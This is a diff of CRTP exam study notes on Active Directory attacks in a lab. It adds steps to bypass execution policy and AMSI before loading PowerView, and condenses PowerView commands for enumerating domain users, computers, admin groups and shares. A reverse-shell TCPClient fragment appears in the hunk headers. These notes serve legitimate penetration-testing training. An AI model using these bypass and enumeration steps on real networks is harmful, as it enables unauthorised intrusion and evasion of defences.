@@ -1,4 +1,12 @@
 # CRTP One Week Challenge
+
+### To bypass AV in the cmd
+1. launch cmd
+2. powershell -ep bypass
+3. AMSI bypass
+4. . .\PowerView.ps1
+
+
 #Main Notes
 ### Things to keep in mind during the exam
 ```
@@ -123,7 +131,7 @@ $client = New-Object System.$class.TCPClient($IPAddress,$PORT)
 
 ## 1. Domain Enumeration
 > 1. [ ] Complete basic Enum
-> 2. [ ] enumerate all users
+> 2. [ ] enumerate all us`ers
 > 3. [ ] enumerate all domain computers
 > 4. [ ] GPO && OU
 > 5. [ ] ACL's 
@@ -188,165 +196,53 @@ $client = New-Object System.$class.TCPClient($IPAddress,$PORT)
 ---
 
 # Domain Enumeration - Basic
-Enumerate following for the dollarcorp domain:
-> 1. [ ] Users
-```
-Get-DomainUser	#check the name at the end
-Get-DomainUser | select -ExpandProperty samaccountname #list a specific property of all the users
-```
-> 2. [ ] Computers
-```
-Get-DomainComputer | select -ExpandProperty dnshostname #list computers
-```
-> 3. [ ] Domain Administrators
-```
-Get-DomainGroup | select name #list domain admin group name
-Get-DomainGroup -Identity "Domain Admins" #details of the domain admins
-Get-DomainGroupMember -Identity "Domain Admins" #enumerate members of the domain admins group. check MemberName & MemberSID
-```
-> 4. [ ] Enterprise Administrators
-```
-Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local #enumerate enterprise admin. you can get the domain name from computer enum
-```
-- run Invisi-Shell then PowerView before Domain Enumeration (bypassing AMSI & loading PowerView)
-```
-RunWithRegistryNonAdmin.bat
-. C:\AD\Tools\PowerView.ps1
-```
-Get current domain
-```
-Get-NetDomain  #check name, Forest, DomainControllers, Children, Parent...
-```
-Get object of another domain
-```
-Get-NetDomain -Domain moneycorp.local
-```
-Get domain SID for the current domain  (security identifier)
-```
-Get-DomainSID  #will be used in other attacks
-```
-Get domain policy for the current domain
-```
-Get-DomainPolicy  
-(Get-DomainPolicy)."Kerberos Policy" #Kerberos tickets info(MaxServiceAge)
-(Get-DomainPolicy)."System Access" #Password policy
-(Get-DomainPolicy).PrivilegeRights #Check your privileges
-```
-Get domain policy for another domain
-```
-(Get-DomainPolicy -domain moneycorp.local)."system access"
-(Get-DomainPolicy -domain moneycorp.local)."kerberos policy"
-(Get-DomainPolicy -domain moneycorp.local)."Privilege Rights"
-```
-Get domain controllers for the current domain
-```
-Get-NetDomainController #check name
-```
-Get domain controllers for another domain
-```
-Get-NetDomainController -Domain moneycorp.local  #check name
-```
-Get a list of all users in the current domain
+1. Get a list of all users in the current domain
 ```
 Get-DomainUser  #list all users
 Get-DomainUser -Identity student1  OR Get-DomainUser -Username student1  #select the information only for student1
-Get-DomainUser -Identity student1 -Properties *  //maybe only for AD module u need to check
 Get-DomainUser | select samaccountname,logonCount  #Get specific property of all users
 Get-DomainUser -LDAPFilter "Description=*built*" | select name,Description
 ```
-Get list of all properties for users in the current domain
-```
-Get-UserProperty
-Get-UserProperty -Properties pwdlastset,logoncount,badpwdcount
-Get-UserProperty -Properties logoncount  #if the user has a low number of logons. user can be a decoy
-Get-UserProperty -Properties badpwdcount
-```
-search for a particular string in a user's attributes (Description)
-```
-Get-DomainUser -LDAPFilter "Description=*built*" | select name,Description
-Find-UserField -SearchField Description -SearchTerm "built"
-```
-Get a list of computers in the current domain
+2. Get a list of computers in the current domain
 ```
 Get-DomainComputer  #get all computers
-Get-DomainComputer | select cn,logonCount
+Get-DomainComputer | select samaccountname, dnshostname
 Get-DomainComputer -OperatingSystem "*Server 2016*"
 Get-DomainComputer -Ping  #check if the machine is alive or not. if firewall is on this may give u a false positive
 Get-DomainComputer -FullData  #list of all data including SID
 ```
-Get all the groups in the current domain
-Enterprise admin group  won't be listed cause it's at the root of the forest
+3. Domain Admins Group
 ```
 Get-DomainGroup | select name
-Get-DomainGroup -Domain <targetdomain> | select cn
-Get-DomainGroup -FullData
-Get-NetComputer -Domain
+Get-DomainGroup -Name "Domain Admins"   #check particular group
+Get-DomainGroup -Domain <targetdomain> -Name "Administrators"   #check particular group for different domain
 ```
-Get all groups containing the word "admin" in group name
-Enterprise admin group  won't be listed cause it's at the root of the forest
+4. Get all the members of a particular group
 ```
-Get-DomainGroup *admin*
-Get-DomainGroup -GroupName *admin*  #all groups with admin name (excluding the root of the forest)
-Get-DomainGroup -GroupName *admin* -Doamin moneycorp.local  #check the forest root (this will return enterprise admin group)
-Get-DomainGroup *Domain Admins* -FullData  #get full data of the domain admin group
+Get-DomainGroupMember -Name "Domain Admins" -Recurse -Domain raman.local
 ```
-Get all the members of the Domain Admins group
+5. Get the group membership of a user
 ```
-Get-DomainGroupMember -Identity "Domain Admins" -Recurse  # check the name & always check the RID in SID if it is 500; if yes means the user is admin
-Get-DomainGroup -GroupName 'Enterprise Admins' -Domain moneycorp.local (we added the domain to check the root as well)
-Get-DomainGroup -GroupName 'Administrators'  #check the MemberName & IsGroup; if IsGroup is false means this is a user
-Get-DomainGroupMember -GroupName 'Administrators' -Recurse  #Enum the membership of a group from the above command
+Get-DomainGroup -UserName "student1"
 ```
-Get the group membership for a user
-opposite to the above command
+6. Enumerate members of the Enterprise Admins group
 ```
-Get-DomainGroup -UserName "student1" | select name
+Get-DomainGroupMember -Name "Enterprise Admins"
+Get-DomainGroupMember -Name "Enterprise Admins" -Domain raman.local
 ```
-List all the local groups on a machine (needs administrator privs on non-dc machines)
+7. List all the local groups on a machine (needs administrator privs on non-dc machines)
 ```
 Get-NetLocalGroup -computerName dcorp-dc
 Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local  #membership of the groups on the domain controller
-Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -ListGroups  #list groups on the domain controller
 ```
-Get members of all the local groups on a machine (needs administrator privs on non-dc machines)
+8. Get members of all the local groups on a machine (needs administrator privs on non-dc machines)
 ```
 Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Recurse
 ```
-Get members of the local group "Administrators" on a machine (needs administrator privs on non-dc machines)
+9. Get members of the local group "Administrators" on a machine (needs administrator privs on non-dc machines)
 ```
 Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators
 ```
-Get actively logged users on a computer (needs local admin rights on the target)
-```
-Get-NetLoggedon -ComputerName dcorp-dc.dollarcorp.moneycorp.local 
-```
-Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)
-```
-Get-LoggedonLocal -ComputerName dcorp-dc.dollarcorp.moneycorp.local 
-```
-Get the last logged user on a computer (needs administrative rights and remote registry on the target)
-```
-Get-LastLoggedon -ComputerName <servername>
-```
-Find shares on hosts in the current domain.
-```
-Invoke-ShareFinder -Verbose
-Invoke-ShareFinder -Verbose -ExcludeStandard -ExcludePrint -ExcludeIPC  #Exclude common or default shares
-```
-Find sensitive files on computers in the domain
-```
-Invoke-FileFinder -Verbose
-```
-Get all fileservers of the domain
-```
-Get-NetFileServer -Verbose
-```
-Enumerate Enterprise Administrators
-```
-Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local
-```
-
----
 
 # Domain Enumeration - Group Policy Object Enumeration
 Enumerate the following for the dollarcorp domain:
